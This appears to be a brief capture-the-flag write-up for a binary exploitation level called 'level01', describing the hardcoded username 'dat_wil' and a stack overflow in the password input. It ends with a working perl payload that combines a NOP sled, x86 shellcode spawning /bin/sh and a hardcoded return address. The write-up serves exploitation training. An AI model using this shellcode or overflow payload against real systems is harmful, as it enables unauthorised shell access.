1. The executable firstly wait for an username and if the username is good, wait for a password in STDIN.
2. We found the string "dat_wil" for username and "admin" for password
3. We deduct that the binary have the same behavior if the password is "admin" or not but the STDIN is always compared with admin
4. The main thing here is that the STDIN for the username is stored in a global variable and the password is stored in the stack
5. So we created a payload that nicely send "dat_wil" first and the exploit after that :

(perl -e 'print "dat_wil" . "\x0a" . "\x90"x10 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "1"x47 . "\x30\xde\xff\xff"'; cat -) | env -i ./level01
